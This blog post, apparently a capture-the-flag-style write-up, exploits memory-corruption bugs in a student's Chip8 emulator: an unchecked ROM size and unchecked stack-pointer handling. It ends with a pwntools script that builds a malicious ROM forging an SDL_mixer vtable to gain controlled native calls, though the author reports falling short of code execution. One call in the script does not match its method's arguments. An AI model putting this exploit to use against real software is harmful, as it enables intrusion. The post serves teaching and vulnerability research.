---
title: (An Attempt at) Pwning a Chip8 Emulator
description: I try to exploit multiple vulnerabilities in a student's project as if it was a CTF
tags: binary-exploitation
---

Recently I was browsing the projects section on the Discord server of the [C-ASM Community](https://discord.gg/c-asm)
(which is a great community and you should join) and I found an interesting
[Chip8 Emulator project](https://github.com/Docas95/CHIP8-Emulator-C). As I was reading through the code and I reached the 
`load_ROM` function I immediately saw a problem
```c
// load content from ROM into memory
void load_ROM(char* filename){
	FILE* f = fopen(filename, "rb");
	if(!f){
		printf("Error opening file!\n");
		exit(1);
	}

	fseek(f, 0L, SEEK_END);
	size_t size = ftell(f);
	fseek(f, 0L, SEEK_SET);

	fread(&chip.memory[ROM_START_ADDRESS], 1, size, f);

	fclose(f);
}
```
The file size is not checked before its contents are written using `fread`!
Then while thinking how to exploit the above issue I found another interesting problem: in the fuction `decode_instruction` the
decrement of the stack pointer for the return instruction
```c
				case 0x00EE:
					// return from subroutine
					chip.pc = chip.stack[chip.stack_pointer-1];
					chip.stack_pointer--;				
				break; 
```
and the increment of the stack pointer for the call instruction
```c
		case 0x2000:
			// call subroutine
			chip.stack[chip.stack_pointer] = chip.pc;
			chip.stack_pointer++;
			chip.pc = NNN;
			break;
```
do not check if the stack will under/over-flow respectively. This can also be used to corrupt memory beyond the limits of the
`chip.stack` array! The question is now: can this be exploited? Can we make a malicious ROM capable of running arbitrary code?

## Exploitation Attempt

For a start let's try using a position *dependent* executable by modifying the `makefile`
```makefile
# Makefile for CHIP-8 Emulator Project

CC = gcc
CFLAGS = -g -fno-pie
OBJS = main.o
TARGET = Chip8
LIBS = -lSDL2 -lSDL2_mixer

$(TARGET): $(OBJS)
	$(CC) -no-pie $(OBJS) -o $(TARGET) $(LIBS)

main.o: main.c main.h
	$(CC) $(CFLAGS) -c main.c
clean:
	rm -f *.o $(TARGET)

run: $(TARGET)
	./$(TARGET)
```

The overflow bugs allows corrupting the global `struct Chip8`, unfortunately the other global variables
after the said structure
```c
struct Chip8 chip;

SDL_Window* window;
SDL_Renderer* renderer;
SDL_Rect square;
Mix_Music *sound;
```
are initialized after the overflow happens in the `init_SDL` function so we can't control them using the overflow.
However I realized I can overwrite them to arbitrary values using this gadget (which is the code that handles the `call` 
instruction)
```c
			// call subroutine
			chip.stack[chip.stack_pointer] = chip.pc;
			chip.stack_pointer++;
			chip.pc = NNN;
			break;
```
we can write the value of `chip.pc` to an arbitrary offset from `chip.stack`. We can control `chip.stack_pointer` using the 
buffer overflow for simplicity, but it should be possible to control it also using the fact that the incrementation of the stack 
pointer is not checked (so invoking `call` the right number of times we can overflow the VM stack and write other memory, this
is in fact when I realized the second bug).
Now that I knew I could overwrite global memory after `init_SDL` is called I started checking what `SDL_Renderer` looks like:
```c
struct SDL_Renderer
{
    void (*WindowEvent)(SDL_Renderer *renderer, const SDL_WindowEvent *event);
    bool (*GetOutputSize)(SDL_Renderer *renderer, int *w, int *h);
    bool (*SupportsBlendMode)(SDL_Renderer *renderer, SDL_BlendMode blendMode);
    bool (*CreateTexture)(SDL_Renderer *renderer, SDL_Texture *texture, SDL_PropertiesID create_props);
    bool (*QueueSetViewport)(SDL_Renderer *renderer, SDL_RenderCommand *cmd);
<SNIP>
};
```
As I saw this I thought JACKPOT. There is what looks like a huge vtable which is great to control code execution. So at this
point the plan was using the above primitive to make the global `renderer` pointer point to a memory region I control, where
I would place a forged `SDL_Renderer` structure.


### Writing arbitrary values using the write primitive
Let me focus on how exactly the overwriting of the `renderer` pointer works. The objective here is overwriting it with
the value `0x406a5e` which points somewhere after the global variables in an area I control via the overflow. Notice that the 
primitive allows to write 16 bits integers and we need to use it twice to first write the value `0x6a5e` in the low bits and then
`0x0040` in the high bits (the other 32 bits seem to be zeroed always).
Let us take a look at `struct Chip8`:
```c
struct Chip8{
        uint8_t memory[MEM_SIZE];
	uint8_t display[ROWS * COLUMNS];
	uint16_t pc;
	uint16_t index; 
	uint16_t stack[16];
	uint8_t stack_pointer;
	uint8_t delay;
	uint8_t sound;
	uint8_t registers[16];
	uint16_t op_code;
	uint8_t draw_flag;
	uint8_t draw_wait;
	uint8_t input[16];
};

```
`MEM_SIZE` here is `0x1000`, during normal execution the program counter is supposed to be in the inclusive bounds `0x-0xfff`,
but we need to write the value `0x6a5e` which is clearly beyond the bounds (recall the primitive writes `chip.pc`).
The places where `chip.pc` is updated take its bounds into consideration: for example the code for the `jump` instruction is
```c
		case 0x1000:
			// jump
			chip.pc = NNN;			
			break;
```
and `NNN` is correctly bounded `uint16_t NNN = 0x0FFF & chip.op_code;`. One place where `chip.pc` bounds are not checked is in
the `fetch_instruction` function
```c
void fetch_instruction(){
	chip.op_code = 0;
	chip.op_code = chip.memory[chip.pc % MEM_SIZE] << 8 | chip.memory[(chip.pc+1) % MEM_SIZE];
	chip.pc+=2;	
}
```
However using this to increment `chip.pc` to `0x6a5e` is not possible as somewhere in the code we need to have a call instruction
to trigger the write and this will reset PC into the correct range, while incrementing it to the target value would require 
executing all memory multiple times without resetting PC to the correct range while doing so.
However what we can do is use the overflow to set PC to `0x6a5c` at the beginning of the execution, the corresponding instruction
fetched will be at the VM address `0xa5c` (note that PC points already to the next instruction when the `call` handling code
is executed, thus we need to set it to what we want to write minus 2).

The second value we have to write is `0x0040`, luckily this is in the valid range, however the ROM is loaded starting from address
`0x200`. To add the `call` code (which triggers the gadget) at address `0x040` we need to use some Chip8 instructions.

The final assembly looks like this (honestly I do not know if there are standard mnemonics for Chip8 instructions, so
I invented them).

At address `0xa5c`, where execution begins due to the overwritten PC, we have
```
CALL 0x200
```
which writes the value `0x6a5e` at the offset from `chip.stack` we control by controlling the stack pointer.
The call moves to address `0x200` where we have
```
MOV V0, 0x22 ; store 0x22 into register V0
MOV V1, 0x22 ; store 0x22 into register V1
SETIDX 0x3e  ; set index to 0x3e
STORE 1      ; store registers V0 and V1 at index [0x3e] = V0, [0x3f] = V1
             ; notice that 0x2222 is the opcode for CALL 0x222
			 ; i chose this to avoid confusing myself with endianness
JUMP 0x3e    ; jump at 0x3e triggering the write
```
Again `0x3e` is what we want to write minus 2. Notice that the stack pointer is incremented by call itself so we are already 
writing in the right memory location. Now what will be executed next depends on what we put at address `0x222`, but we will discuss this later.


### Arbitrary call primitive
Now that we control the `renderer` pointer we should be able to use its vtable to get an arbitrary call primitive pretty easily, 
right?
Well, unfortunately the `SDL2` pointers are validated against a global hash table and unless we control also that hash table, the 
vtable functions will never be called
```c
bool SDL_ObjectValid(void *object, SDL_ObjectType type)
{
    if (!object) {
        return false;
    }

    const void *object_type;
    if (!SDL_FindInHashTable(SDL_objects, object, &object_type)) {
        return false;
    }

    return (((SDL_ObjectType)(uintptr_t)object_type) == type);
}
```
This seems more of a dynamic type check rather than a security mechanism, but it makes the exploitation more complicated too.
OUCH!

However there still is `Mix_Music *sound;` which comes from a different library also by SDL called `SDL_mixer`. I thought maybe
they will still use vtables here, but due to this being a newer library maybe this kind of checks are not there. And indeed
```c
struct Mix_Music {
    Mix_MusicInterface *interface;
    void *context;

    bool playing;
    Mix_Fading fading;
    int fade_step;
    int fade_steps;

    char filename[1024];
};
```
The `Mix_MusicInterface` type sound like a vtable and in fact
```c
typedef struct
{
    const char *tag;
    Mix_MusicAPI api;
    Mix_MusicType type;
    bool loaded;
    bool opened;

    /* Load the library */
    int (*Load)(void);

    /* Initialize for the audio output */
    int (*Open)(const SDL_AudioSpec *spec);

    /* Create a music object from an SDL_IOStream stream
     * If the function returns NULL, 'src' will be freed if needed by the caller.
     */
    void *(*CreateFromIO)(SDL_IOStream *src, bool closeio);

    /* Create a music object from a file, if SDL_IOStream are not supported */
    void *(*CreateFromFile)(const char *file);

    /* Set the volume */
    void (*SetVolume)(void *music, int volume);

    /* Get the volume */
    int (*GetVolume)(void *music);

    /* Start playing music from the beginning with an optional loop count */
    int (*Play)(void *music, int play_count);

    /* Returns true if music is still playing */
    bool (*IsPlaying)(void *music);

    /* Get music data, returns the number of bytes left */
    int (*GetAudio)(void *music, void *data, int bytes);

    /* Jump to a given order in mod music */
    int (*Jump)(void *music, int order);

    /* Seek to a play position (in seconds) */
    int (*Seek)(void *music, double position);

    /* Tell a play position (in seconds) */
    double (*Tell)(void *music);

    /* Get Music duration (in seconds) */
    double (*Duration)(void *music);

    /* Tell a loop start position (in seconds) */
    double (*LoopStart)(void *music);

    /* Tell a loop end position (in seconds) */
    double (*LoopEnd)(void *music);

    /* Tell a loop length position (in seconds) */
    double (*LoopLength)(void *music);

    /* Get a meta-tag string if available */
    const char* (*GetMetaTag)(void *music, Mix_MusicMetaTag tag_type);

    /* Get number of tracks. Returns -1 if not applicable */
    int (*GetNumTracks)(void *music);

    /* Start a specific track */
    int (*StartTrack)(void *music, int track);

    /* Pause playing music */
    void (*Pause)(void *music);

    /* Resume playing music */
    void (*Resume)(void *music);

    /* Stop playing music */
    void (*Stop)(void *music);

    /* Delete a music object */
    void (*Delete)(void *music);

    /* Close the library and clean up */
    void (*Close)(void);

    /* Unload the library */
    void (*Unload)(void);
} Mix_MusicInterface;
```
and the checks are missing too: BINGO!

So what we do with the assembly at `0x222`? Well we need to call some of those virtual function. In `main` we have
```c
		// play sound
		if(chip.sound){
			Mix_PlayMusic(sound, 1);
		}
```
and `chip.sound` is controlled via a specific instruction (let me call it `SOUND X`) which sets `chip.sound` to the value of `VX`.
Since we already have some different than zero value in `V0` and `V1` we can just put the following assembly at`0x222`
```
SOUND 0
```
Now let me explore the SDL2_mixer source code. Here is `Mix_PlayMusic`
```c
bool Mix_PlayMusic(Mix_Music *music, int loops)
{
    return Mix_FadeInMusicPos(music, loops, 0, 0.0);
}
```
Here is `Mix_FadeInMusicPos`
```c
bool Mix_FadeInMusicPos(Mix_Music *music, int loops, int ms, double position)
{
    bool retval;

    if (ms_per_step == 0) {
        SDL_SetError("Audio device hasn't been opened");
        return false;
    }

    /* Don't play null pointers :-) */
    if (music == NULL) {
        SDL_SetError("music parameter was NULL");
        return false;
    }

    /* Setup the data */
    if (ms) {
        music->fading = MIX_FADING_IN;
    } else {
        music->fading = MIX_NO_FADING;
    }
    music->fade_step = 0;
    music->fade_steps = (ms + ms_per_step - 1) / ms_per_step;

    /* Play the puppy */
    Mix_LockAudio();
    /* If the current music is fading out, wait for the fade to complete */
    while (music_playing && (music_playing->fading == MIX_FADING_OUT)) {
        Mix_UnlockAudio();
        SDL_Delay(100);
        Mix_LockAudio();
    }
    if (loops == 0) {
        /* Loop is the number of times to play the audio */
        loops = 1;
    }
    retval = (music_internal_play(music, loops, position) == 0);
    /* Set music as active */
    music_active = retval;
    Mix_UnlockAudio();

    return retval;
}
```
The interesting bits seems to be in `music_internal_play`
```c
static int music_internal_play(Mix_Music *music, int play_count, double position)
{
    int retval = 0;

    /* Note the music we're playing */
    if (music_playing) {
        music_internal_halt();
    }
    music_playing = music;
    music_playing->playing = true;

    /* Set the initial volume */
    music_internal_initialize_volume();

    /* Set up for playback */
    retval = music->interface->Play(music->context, play_count);

    /* Set the playback position, note any errors if an offset is used */
    if (retval == 0) {
        if (position > 0.0) {
            if (music_internal_position(position) < 0) {
                SDL_SetError("Position not implemented for music type");
                retval = -1;
            }
        } else {
            music_internal_position(0.0);
        }
    }

    /* If the setup failed, we're not playing any music anymore */
    if (retval < 0) {
        music->playing = false;
        music_playing = NULL;
    }
    return retval;
}
```
This function first checks if music is playing already by checking the global variable `music_playing` is not `NULL`: in that 
case there is music playing stored in the global pointer `music_playing` and it is stopped via `music_internal_halt`
```c
static void music_internal_halt(void)
{
    if (music_playing->interface->Stop) {
        music_playing->interface->Stop(music_playing->context);
    }

    music_playing->playing = false;
    music_playing->fading = MIX_NO_FADING;
    music_playing = NULL;
}
```
This does call a function in the vtable (the `Stop` function): to trigger this we need to trigger `Mix_PlayMusic` twice
before the first sample has finished playing.

Continuing the global `music_playing` is set and there is a call to `music_internal_initialize_volume`
```c
static void music_internal_initialize_volume(void)
{
    if (music_playing->fading == MIX_FADING_IN) {
        music_internal_volume(0);
    } else {
        music_internal_volume(music_volume);
    }
}
```
which calls `music_internal_volume`
```c
static void music_internal_volume(int volume)
{
    if (music_playing->interface->SetVolume) {
        music_playing->interface->SetVolume(music_playing->context, volume);
    }
}
```
which calls the `SetVolume` vtable function with the `music_playing->context` as first parameter. Clearly we control both the 
vtable and the `context` variable (which will be passed in the `rdi` register).

Then there is a another call to the vtable function `Play` again passing `context` as first argument: this is the second 
arbitrary call.

Finally, there is a call to `music_internal_position`
```c
int music_internal_position(double position)
{
    if (music_playing->interface->Seek) {
        return music_playing->interface->Seek(music_playing->context, position);
    }
    return -1;
}
```
which will call the vtable function `Seek`.

At this point I was a bit stuck until I realized that I was placing the fake music object at the wrong address. In order for
the Chip8 code to interact with these primitives I need to put the fake music object on the Chip8's memory!

I decided to only use the call to `Play` as we can trigger it multiple times anyhow. All the other `interface` pointer are
`NULL`-checked so I set them to `NULL`to avoid the calls.

The address we must now write to the global `sound` variable is `0x406020`. Unfortunately, this seems impossible to me as I would
have to write the value `0x6020` which would correspond to making execution start at a PC of `0x1e` and I do not control what 
instructions are there at the beggining of the execution (well to be fair `0x406020` is chosen a bit randomly in the VM's 
memory, there may be some address which can be written and is also in the VM's memory, but at this point I started being lazy).

What I can however do is place the `interface` in the Chip8's memory while having the fake music object places at the already said
address: `0x406a5e`.

### Controlling `call`s from the Chip8 assembly

Now I am in a position in which I can control `call` instructions (the x64 `call`, not the chip8's) from the chip8's assembly,
by simplying writing where I want to call at a specific memory location and then triggering the sound. Before at address `0x222`
I was simpling triggering the sound once, now let me do something more complicated. We can first write where to call using the Chip8's assembly and then call it by triggering the sound, in this way I have multiple controlled calls. And while I can't
control `rdi` at every call I made it point to the beggining of the Chip8's memory so that I dynamically control what it
points to. For example calling `printf@plt` I can achieve the following
```
└─$ ./Chip8 exploit
hello world
this is written by the chip8's code
zsh: segmentation fault  ./Chip8 exploit

```

### Arbitrary file read using `load_ROM`

There is one interesting function to call and it is `load_ROM`! This just read any file into the Chip8's memory starting at
address `0x200`. I thought I can just read `/proc/self/maps` and kill ASLR. Unfortunately, I'd like to find the `libc` base
(to then call `system`) and the file is so big that the `libc` address wouldn't end up in the readable memory. In general it 
turns out I can't really read files under `/proc` as the `size` local variable in `load_ROM` ends up being zero when reading them.

Overall this is an interesting primitive, but not being able to read `/proc` files leaves me confused on how to use this to defeat
ASLR (which is what keeping me from calling `system` and getting arbitrary code execution).

## Conclusion

Unfortunately I was not able to turn this into arbitrary code execution: my limited knowledge and the fact that the imported 
functions by the binary are so few make the exploitation not straightforward. However I would argue there are loads of 
possibilities to be explored with the primitives I built.

Also this was all done disabling PIE, with PIE enabled the explotation seems more complicated. It would be possible to use a
partial overwrite to overwrite the `sound` pointer, however this lives on the heap and we have no control of the heap, so even
then the partial overwrite would be useless.

Anyhow, here is the full hello world exploit code. Please if you are able to turn this into arbitrary code execution let me know
by sending a DM on [X](https://x.com/lucabtz_), thanks for reading!
```py
import pwn

# pwndbg> ptype /o struct Chip8
#/* offset      |    size */  type = struct Chip8 {
#/*      0      |    4096 */    uint8_t memory[4096];
#/*   4096      |    2048 */    uint8_t display[2048];
#/*   6144      |       2 */    uint16_t pc;
#/*   6146      |       2 */    uint16_t index;
#/*   6148      |      32 */    uint16_t stack[16];
#/*   6180      |       1 */    uint8_t stack_pointer;
#/*   6181      |       1 */    uint8_t delay;
#/*   6182      |       1 */    uint8_t sound;
#/*   6183      |      16 */    uint8_t registers[16];
#/* XXX  1-byte hole      */
#/*   6200      |       2 */    uint16_t op_code;
#/*   6202      |       1 */    uint8_t draw_flag;
#/*   6203      |       1 */    uint8_t draw_wait;
#/*   6204      |      16 */    uint8_t input[16];
#
#                               /* total size (bytes): 6220 */
#                             }


ROM_START_OFFSET   = 0x200

# chip struct offsets from rom start
PC_OFFSET          = 6144 - 0x200
SP_OFFSET          = 6180 - 0x200
CHIP_STRUCT_SIZE   = 6220

MUSIC_ADDR         = 0x406990
CHIP_ADDR          = 0x405120
BUFFER_START_ADDR  = CHIP_ADDR + ROM_START_OFFSET
MEMORY_END_ADDR    = CHIP_ADDR + 0x1000
STACK_ADDR         = CHIP_ADDR + 6148

# offset of music from chip.stack
MUSIC_OFFSET       = MUSIC_ADDR - STACK_ADDR 
SP_VALUE           = int(MUSIC_OFFSET / 2)

PRINTF_PLT         = 0x401080

    #struct Mix_Music {
    #    Mix_MusicInterface *interface;
    #    void *context;
    #
    #    bool playing;
    #    Mix_Fading fading;
    #    int fade_step;
    #    int fade_steps;
    #
    #    char filename[1024];
    #};

    #sizeof(struct Mix_Music) = 1056
    #sizeof(struct Mix_Music) - filename = 32
    #sizeof(Mix_MusicInterface) = 224
    #offsetof(Mix_MusicInterface, SetVolume) = 56
    #offsetof(Mix_MusicInterface, Play) = 72
    #offsetof(Mix_MusicInterface, Seek) = 104
    #offsetof(Mix_MusicInterface, Stop) = 192

FAKE_MUSIC_ADDR    = 0x406a5e
INTERFACE_ADDR     = MEMORY_END_ADDR - 224
PLAY_ADDR          = INTERFACE_ADDR + 72
PLAY_CHIP_ADDR     = PLAY_ADDR - CHIP_ADDR


def pad(b, n, padding=b"A"):
    return (b + n * padding)[:n]

def read_file(filename: str):
    with open(filename, "rb") as f:
        return f.read()

class Asm:
    def __init__(self):
        self.instructions = 0
        self.pc = 0x200
        self.code = b""

    def _validate_addr(self, addr: int):
        if not addr & 0xfff == addr:
            print(addr)
            assert False

    def _validate_x(self, x: int):
        assert x & 0xf == x

    def _validate_nn(self, nn: int):
        assert nn & 0xff == nn

    def _increment_pc(self):
        self.pc += 2
        self.instructions = (self.instructions + 1) % 11

    def _pack_opcode(self, opcode):
        return pwn.pack(opcode, word_size=16, endianness="big")

    def jump(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0x1000 | addr)

    def call(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0x2000 | addr)

    def set_index(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0xa000 | addr)

    def store_vx(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf055 | (x << 8))

    def load_vx_imm(self, x: int, imm: int):
        self._validate_x(x)
        self._validate_nn(imm)
        self._increment_pc()
        self.code += self._pack_opcode(0x6000 | (x << 8) | imm)

    def clear_screen(self):
        self._increment_pc()
        self.code += self._pack_opcode(0x00e0)

    def set_sound(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf018 | (x << 8))

    def nop(self):
        self.jump(self.pc+2)

    def seek_pc(self, seeked_pc):
        self._validate_addr(seeked_pc)
        assert seeked_pc > self.pc
        assert seeked_pc % 2 == 0
        for _ in range(int((seeked_pc-self.pc)/2)):
            self.nop()
        self.pc = seeked_pc

    def label(self):
        return self.pc

    def write_qword_le(self, addr: int, qword: int):
        self.set_index(addr)
        for i in range(8):
            self.load_vx_imm(i, (qword >> (8 * i)) & 0xFF)
        self.store_vx(7)

    def write_bytes(self, addr: int, b: bytes):
        self.set_index(addr)
        for byte in b:
            self.load_vx_imm(0, byte)
            self.store_vx(0)

    def native_call_primitive(self, address: int):
        self.write_qword_le(PLAY_CHIP_ADDR, address)
        self.load_vx_imm(0, 1)
        self.set_sound(0)
        while self.instructions != 0:
            self.nop()

    def assemble(self):
        return self.code

def exploit():
    pwn.info(f"Placing fake music interface object at address {hex(INTERFACE_ADDR)} (chip8 addr {hex(INTERFACE_ADDR - CHIP_ADDR)})")
    pwn.info(f"Execution starts at pc = {hex(((FAKE_MUSIC_ADDR & 0xffff) - 2) & 0xfff)}")

    asm = Asm()

    _start = asm.label()
    asm.load_vx_imm(0, 0x22)
    asm.load_vx_imm(1, 0x22)
    asm.set_index(0x40-2)
    asm.store_vx(1)
    asm.jump(0x40-2)

    asm.seek_pc(0x222)
    # at this point the machine is 'booted': profit

    asm.write_bytes(b"hello from the chip8!\n\0")
    asm.native_call_primitive(PRINTF_PLT)

    # more booting code
    asm.seek_pc(((FAKE_MUSIC_ADDR & 0xffff) - 2) & 0xfff)
    asm.call(_start)

    code = asm.assemble()

    forged_chip_struct = pad(code, PC_OFFSET, padding=b"\x00")
    forged_chip_struct += pwn.p16((FAKE_MUSIC_ADDR & 0xffff) - 2) # forged pc
    forged_chip_struct += b"\x00" * (SP_OFFSET - PC_OFFSET - 2)
    forged_chip_struct += pwn.p8(SP_VALUE) # forged sp
    forged_chip_struct = pad(forged_chip_struct, CHIP_STRUCT_SIZE - ROM_START_OFFSET, padding=b"\x00")


    # interface
    forged_music_struct = pwn.p64(INTERFACE_ADDR) # put the interface into chip8's memory
    # context
    forged_music_struct += pwn.p64(CHIP_ADDR) # point context into the start of chip8's memory
    # just pad the rest of the values with zeros
    forged_music_struct = pad(forged_music_struct, 1056, padding=b"\x00")

    forged_music_interface_struct = b"\x00" * 72
    forged_music_interface_struct += pwn.p64(0x0000000000401016)
    forged_music_interface_struct = pad(forged_music_interface_struct, 224, padding=b"\x00")

    rom = forged_chip_struct
    rom += b"\x00" * (FAKE_MUSIC_ADDR - (CHIP_ADDR + ROM_START_OFFSET + len(forged_chip_struct)))
    rom += forged_music_struct

    with open("exploit", "wb") as f:
        f.write(rom)


if __name__ == "__main__":
    exploit()
```